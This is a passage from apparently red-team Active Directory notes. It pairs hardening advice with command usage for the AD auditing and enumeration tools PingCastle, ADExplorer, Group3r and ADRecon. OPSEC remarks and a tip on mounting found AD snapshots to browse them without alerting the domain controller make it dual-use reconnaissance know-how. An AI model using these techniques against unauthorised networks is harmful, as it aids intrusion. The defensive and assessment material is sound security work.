- `Full and current application inventory`
- `A list of all enterprise hosts and their location`
- `Any trust relationships we have with other domains or outside entities`
- `Users who have elevated permissions`

## Prevention

### Technology

- Run tools such as 5d, PingCastle, and Grouper periodically to identify AD misconfigurations.
- Ensure that administrators are not storing passwords in the AD account description field.
- Review SYSVOL for scripts containing passwords and other sensitive data.
- Avoid the use of "normal" service accounts, utilizing Group Managed (gMSA) and Managed Service Accounts (MSA) where ever possible to mitigate the risk of Kerberoasting.
- Disable Unconstrained Delegation wherever possible.
- Prevent direct access to Domain Controllers through the use of hardened jump hosts.
- Consider setting the `ms-DS-MachineAccountQuota` attribute to `0`, which disallows users from adding machine accounts and can prevent several attacks such as the noPac attack and Resource-Based Constrained Delegation (RBCD)
- Disable the print spooler service wherever possible to prevent several attacks
- Disable NTLM authentication for Domain Controllers if possible
- Use Extended Protection for Authentication along with enabling Require SSL only to allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Enable SMB signing and LDAP signing
- Take steps to prevent enumeration with tools like BloodHound
- Ideally, perform quarterly penetration tests/AD security assessments, but if budget constraints exist, these should be performed annually at the very least.
- Test backups for validity and review/practice disaster recovery plans.
- Enable the restriction of anonymous access and prevent null session enumeration by setting the `RestrictNullSessAccess` registry key to `1` to restrict null session access to unauthenticated users.

### People

- The organization should have a strong password policy, with a password filter that disallows the use of common words (i.e., welcome, password, names of months/days/seasons, and the company name). If possible, an enterprise password manager should be used to assist users with choosing and using complex passwords.
- Rotate passwords periodically for **all** service accounts.
- Disallow local administrator access on user workstations unless a specific business need exists.
- Disable the default `RID-500 local admin` account and create a new admin account for administration subject to LAPS password rotation.
- Implement split tiers of administration for administrative users. Too often, during an assessment, you will gain access to Domain Administrator credentials on a computer that an administrator uses for all work activities.
- Clean up privileged groups. `Does the organization need 50+ Domain/Enterprise Admins?` Restrict group membership in highly privileged groups to only those users who require this access to perform their day-to-day system administrator duties.
- Disable Kerberos delegation for administrative accounts (the Protected Users group may not do this)
- Where appropriate, place accounts in the `Protected Users` group.
    - https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

```powershell
# Viewing the Protected Users Group (ADSI)
$root = [ADSI]"LDAP://RootDSE"
$defaultNC = $root.defaultNamingContext.Value
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$defaultNC")
$searcher.Filter = "(&(objectCategory=group)(samAccountName=Protected Users))"
$searcher.PropertiesToLoad.Add("name") | Out-Null
$searcher.PropertiesToLoad.Add("description") | Out-Null
$searcher.PropertiesToLoad.Add("member") | Out-Null
$searcher.FindOne() | ForEach-Object { $_.Properties }
```

# Reporting and Auditing

### PingCastle

**Role:** Generates a "Health Check" report based on a maturity model. Bridges the gap between technical findings and C-Level risk scores.
**OPSEC:** Moderate. Generates significant LDAP traffic but looks like admin activity.

```cmd
# Interactive Mode (Best for first run)
PingCastle.exe

# Healthcheck Report (Non-Interactive)
# Generates an HTML report in the current directory
PingCastle.exe --healthcheck --server <DC_FQDN>

# Scan specific risk areas (Scanner Mode)
# Options: aclcheck, antivirus, localadmin, laps_bitlocker, etc.
PingCastle.exe --scanner aclcheck
```

### Active Directory Explorer (Sysinternals)

**Role:** Creates (and mounts) snapshots of the AD Database for offline analysis.
**Attack Vector:** If you find `.dat` snapshot files on shares, you can mount them to browse AD as it was at that time *without* alerting the DC.

```cmd
# Create a Snapshot (Requires Creds)
# -snapshot: Create a snapshot
# "" : Prompt for password
ADExplorer.exe -snapshot "" <DC_FQDN> output_filename

# Mount a Snapshot (Offline Analysis)
# Allows you to browse a .dat file found on a share
ADExplorer.exe -snapshot "" <PATH_TO_DAT_FILE>
```

### Group3r

**Role:** Deep-dive auditing of **Group Policy Objects (GPOs)**. Unlike standard tools that check permissions, this parses the *content* of GPOs to find hardcoded passwords, local admin deployments, and script definitions.

```cmd
# Basic Scan (Output to Console)
group3r.exe -s

# Full Scan (Output to File)
# -f: Output file path
group3r.exe -f results.log
```

### ADRecon

**Role:** Extracts *everything* from the domain (Users, Computers, GPOs, DNS, LAPS, BitLocker) and compiles it into a massive Excel report.
**OPSEC:** 💀 **EXTREMELY LOUD.** Do not use during a Red Team engagement unless you have burned the environment or are simulating an "Ignorant Insider."

```powershell
# Run Audit (Requires Excel installed for pretty reports, otherwise CSV)
.\ADRecon.ps1

# Run on specific target Domain Controller
.\ADRecon.ps1 -DomainController <DC_IP>

# Generate Excel report from CSVs (Run offline on analyst machine)
.\ADRecon.ps1 -GenExcel <PATH_TO_CSV_FOLDER>
```